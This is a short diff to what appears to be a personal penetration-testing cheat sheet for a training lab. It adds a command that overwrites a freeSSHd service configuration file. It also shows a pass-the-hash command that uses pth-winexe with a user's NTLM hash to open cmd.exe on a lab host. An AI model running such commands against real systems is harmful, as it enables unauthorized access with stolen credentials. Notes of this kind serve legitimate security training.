@@ -56,6 +56,10 @@ mget *   ##confirm with yes on all files . Maybe /y will help ?
 ## to copy multiple files from the local machine to the remote machine;
 mput *   ##confirm with yes on all files . Maybe /y will help ?
 
+
+#Copy a file in cmd
+copy FreeSSHDService.ini c:\"Program Files"\freeSSHd /y
+
 #pass the hash Windows
 pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //10.11.1.49 cmd.exe
 #after % starts the password
